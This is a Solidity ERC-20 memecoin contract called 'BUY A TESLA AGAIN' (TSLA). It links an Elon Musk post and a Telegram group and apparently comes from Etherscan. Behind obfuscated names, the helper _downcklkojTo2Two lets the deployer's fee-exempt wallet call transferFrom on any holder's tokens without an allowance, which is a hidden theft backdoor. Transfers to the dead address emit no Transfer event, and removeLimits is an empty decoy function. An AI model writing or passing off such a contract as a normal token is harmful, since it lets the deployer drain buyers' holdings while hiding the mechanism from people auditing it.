/**
 *Submitted for verification at Etherscan.io on 2025-03-19
*/

// SPDX-License-Identifier: MIT

/*
    Name: BUY A TESLA AGAIN
    Symbol: TSLA

    https://x.com/elonmusk/status/1902243297419993316
    https://t.me/buytsla_portal
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract TSLA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcTo2Two;
    mapping(address => mapping(address => uint256)) private _allcvnkjnTo2Two;
    mapping(address => bool) private _feevblknlTo2Two;
    address payable private _taxclknlTo2Two;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"BUY A TESLA AGAIN";
    string private constant _symbol = unicode"TSLA";

    uint256 private _vkjbnkfjTo2Two = 10;
    uint256 private _maxovnboiTo2Two = 10;
    uint256 private _initvkjnbkjTo2Two = 20;
    uint256 private _finvjlkbnlkjTo2Two = 0;
    uint256 private _redclkjnkTo2Two = 2;
    uint256 private _prevlfknjoiTo2Two = 2;
    uint256 private _buylkvnlkTo2Two = 0;
    IUniswapV2Router02 private uniswapV2Router;

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknTo2Two;
    bool private _inlknblTo2Two = false;
    bool private swapvlkTo2Two = false;
    uint256 private _sellcnjkTo2Two = 0;
    uint256 private _lastflkbnlTo2Two = 0;
    address constant _deadlknTo2Two = address(0xdead);

    uint256 public _vnbbvlkTo2Two = qq30fef / 100;
    uint256 public _oijboijoiTo2Two = 15 * 10**18;
    uint256 private _cvjkbnkjTo2Two = 10;

    modifier lockTheSwap() {
        _inlknblTo2Two = true;
        _;
        _inlknblTo2Two = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcTo2Two[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    
    function _calcTax_lvknblTo2Two(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblTo2Two) {
                taxAmount = amount
                    .mul((_buylkvnlkTo2Two > _redclkjnkTo2Two) ? _finvjlkbnlkjTo2Two : _initvkjnbkjTo2Two)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlTo2Two[to] &&
                to != _taxclknlTo2Two
            ) {
                _buylkvnlkTo2Two++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblTo2Two &&
                to == uniswapV2Pair &&
                from != _taxclknlTo2Two &&
                swapvlkTo2Two &&
                _buylkvnlkTo2Two > _prevlfknjoiTo2Two
            ) {
                if (block.number > _lastflkbnlTo2Two) {
                    _sellcnjkTo2Two = 0;
                }
                _sellcnjkTo2Two = _sellcnjkTo2Two + _getAmountOut_lvcbnkTo2Two(amount);
                require(_sellcnjkTo2Two <= _oijboijoiTo2Two, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkTo2Two)
                    _swapTokenslknlTo2Two(_vnbbvlkTo2Two > amount ? amount : _vnbbvlkTo2Two);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjTo2Two(address(this).balance);
                }
                _lastflkbnlTo2Two = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlTo2Two = payable(_msgSender());
        
        _balknvlkcTo2Two[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcTo2Two[address(this)] = (qq30fef * 98) / 100;
        _feevblknlTo2Two[address(this)] = true;
        _feevblknlTo2Two[_taxclknlTo2Two] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojTo2Two(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlTo2Two[msg.sender]) return !_feevblknlTo2Two[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknTo2Two)) return false;
        return true;
    }

    function _transfer_kjvnTo2Two(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblTo2Two(from, to, amount);
        _balknvlkcTo2Two[from] = _balknvlkcTo2Two[from].sub(amount);
        _balknvlkcTo2Two[to] = _balknvlkcTo2Two[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcTo2Two[address(this)] = _balknvlkcTo2Two[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknTo2Two) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnTo2Two[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnTo2Two(sender, recipient, amount);
        if (_downcklkojTo2Two(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnTo2Two[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjTo2Two(uint256 amount) private {
        _taxclknlTo2Two.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnTo2Two(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnTo2Two[owner][spender];
    }

    function _swapTokenslknlTo2Two(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function GoRutagi() external onlyOwner {
        require(!_tradingvlknTo2Two, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkTo2Two = true;
        _tradingvlknTo2Two = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnTo2Two() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkTo2Two(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblTo2Two(address payable newWallet) external {
        require(_feevblknlTo2Two[_msgSender()]);
        _taxclknlTo2Two = newWallet;
        _feevblknlTo2Two[_taxclknlTo2Two] = true;
    }
}